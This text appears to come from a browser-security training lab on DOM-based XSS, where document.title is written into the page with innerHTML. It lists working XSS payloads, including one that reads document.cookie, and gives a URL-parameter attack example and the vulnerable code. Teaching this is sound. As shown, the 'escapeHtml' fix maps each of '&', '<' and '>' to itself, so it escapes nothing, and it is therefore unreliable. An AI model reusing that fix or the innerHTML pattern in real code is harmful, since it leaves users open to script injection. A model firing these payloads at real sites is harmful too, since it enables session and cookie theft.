document.title Injection
This lab reads the page title and injects it into the DOM using innerHTML — NO sanitization.
The title can be controlled via URL parameters or user input.
Goal: Execute JavaScript by injecting malicious code into the document title.
VULNERABLE TARGET (Title Injection)

How this works:
• The page reads document.title (the browser tab title).
• It injects the title into the page using innerHTML (VULNERABLE!).
• If the title contains HTML/JavaScript, it will execute when reflected.
• In real attacks, the title can be controlled via URL parameters or stored data.
Hints (click to expand)
  • The vulnerable code reads document.title and uses innerHTML to render it.
  • Click "Set XSS: img onerror" - it WILL pop an alert immediately.
  • Try setting a custom title with <svg onload=alert(1)> in the input.
  • The XSS executes because the title is injected via innerHTML.
  • Notice how the browser tab title also changes!

Solution & Explanation

Working Payloads (as title values):

  • <img src=x onerror=alert('XSS')> — Image error event
  • <body onload=alert(document.cookie)> — Body onload
  • <svg onload=alert(1)> — SVG onload
  • <script>alert('Title XSS')</script> — Script tag

Real-world attack scenarios:

  1. URL Parameter Injection: page.html?title=<img src=x onerror=alert(1)>
  2. Stored Title XSS: If titles are stored in a database and reflected later
  3. Dashboard widgets that display page titles from user input

Vulnerable Code:

// VULNERABLE: Reading title and injecting with innerHTML
let pageTitle = document.title;
document.getElementById('output').innerHTML = pageTitle;

How to Fix:

// FIX #1: Use textContent instead of innerHTML
let pageTitle = document.title;
document.getElementById('output').textContent = pageTitle;

// FIX #2: Escape HTML entities before inserting
function escapeHtml(str) {
    return str.replace(/[&<>]/g, function(m) {
        if (m === '&') return '&';
        if (m === '<') return '<';
        if (m === '>') return '>';
        return m;
    });
}
document.getElementById('output').innerHTML = escapeHtml(pageTitle);

Key Point: Never trust document.title if it can be controlled by users. Always sanitize before using in HTML.
